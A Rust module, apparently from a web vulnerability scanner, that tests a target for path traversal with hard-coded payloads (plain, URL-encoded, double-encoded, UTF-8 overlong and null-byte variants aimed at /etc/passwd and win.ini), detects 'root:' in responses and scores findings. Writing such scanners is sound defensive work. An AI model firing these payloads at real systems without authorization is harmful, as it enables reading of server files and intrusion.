use aegis_protocol::finding::VulnerabilityClass;
use aegis_protocol::operation::OperationLogEntry;

use crate::recon_client;

#[derive(Debug, Clone, PartialEq)]
pub enum PathTraversalIssue {
    TraversalSucceeded {
        param: String,
        payload: String,
        indicator: String,
    },
    EncodedTraversalSucceeded {
        param: String,
        encoding: String,
    },
    NullByteInjection {
        param: String,
    },
}

impl std::fmt::Display for PathTraversalIssue {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::TraversalSucceeded { param, payload, .. } => {
                write!(f, "path_traversal:{param}:{payload}")
            }
            Self::EncodedTraversalSucceeded { param, encoding } => {
                write!(f, "encoded_path_traversal:{param}:{encoding}")
            }
            Self::NullByteInjection { param } => {
                write!(f, "null_byte_injection:{param}")
            }
        }
    }
}

const FILE_PARAMS: &[&str] = &[
    "file", "path", "page", "document", "folder", "dir", "include", "template", "load", "read",
];

const TRAVERSAL_PAYLOADS: &[(&str, &str)] = &[
    ("../../../etc/passwd", "root:"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("....//....//....//etc/passwd", "root:"),
];

const ENCODED_PAYLOADS: &[(&str, &str, &str)] = &[
    (
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "url_encoded",
        "root:",
    ),
    (
        "..%252f..%252f..%252fetc%252fpasswd",
        "double_encoded",
        "root:",
    ),
    (
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "utf8_overlong",
        "root:",
    ),
];

const NULL_PAYLOAD: &str = "....//....//etc/passwd%00.png";

pub fn audit_path_traversal(target: &str) -> Vec<PathTraversalIssue> {
    if recon_client::validated_domain(target).is_none() {
        return Vec::new();
    }
    let Some(client) = recon_client::default_client() else {
        return Vec::new();
    };

    let base = target.trim_end_matches('/');
    let mut issues = Vec::new();

    for &param in FILE_PARAMS {
        for &(payload, indicator) in TRAVERSAL_PAYLOADS {
            let url = format!("{base}?{param}={payload}");
            if let Ok(resp) = client.get(&url).send()
                && resp.status().is_success()
                && let Ok(body) = resp.text()
                && body.contains(indicator)
            {
                issues.push(PathTraversalIssue::TraversalSucceeded {
                    param: param.to_string(),
                    payload: payload.to_string(),
                    indicator: indicator.to_string(),
                });
                break;
            }
        }

        for &(payload, encoding, indicator) in ENCODED_PAYLOADS {
            let url = format!("{base}?{param}={payload}");
            if let Ok(resp) = client.get(&url).send()
                && resp.status().is_success()
                && let Ok(body) = resp.text()
                && body.contains(indicator)
            {
                issues.push(PathTraversalIssue::EncodedTraversalSucceeded {
                    param: param.to_string(),
                    encoding: encoding.to_string(),
                });
                break;
            }
        }

        let null_url = format!("{base}?{param}={NULL_PAYLOAD}");
        if let Ok(resp) = client.get(&null_url).send()
            && resp.status().is_success()
            && let Ok(body) = resp.text()
            && body.contains("root:")
        {
            issues.push(PathTraversalIssue::NullByteInjection {
                param: param.to_string(),
            });
        }
    }

    issues
}

pub fn analyze_traversal_response(
    param: &str,
    payload: &str,
    indicator: &str,
    status: u16,
    body: &str,
) -> Option<PathTraversalIssue> {
    if !(200..300).contains(&status) {
        return None;
    }
    if !body.contains(indicator) {
        return None;
    }
    Some(PathTraversalIssue::TraversalSucceeded {
        param: param.to_string(),
        payload: payload.to_string(),
        indicator: indicator.to_string(),
    })
}

pub(crate) fn path_traversal_severity(issue: &PathTraversalIssue) -> f64 {
    match issue {
        PathTraversalIssue::TraversalSucceeded { .. } => 9.0,
        PathTraversalIssue::EncodedTraversalSucceeded { .. } => 8.5,
        PathTraversalIssue::NullByteInjection { .. } => 8.0,
    }
}

pub fn path_traversal_to_operations(
    issues: &[PathTraversalIssue],
    seq: &mut u64,
) -> Vec<OperationLogEntry> {
    issues
        .iter()
        .map(|issue| {
            recon_client::finding_entry(
                seq,
                VulnerabilityClass::PathTraversal,
                path_traversal_severity(issue),
                0.95,
            )
        })
        .collect()
}
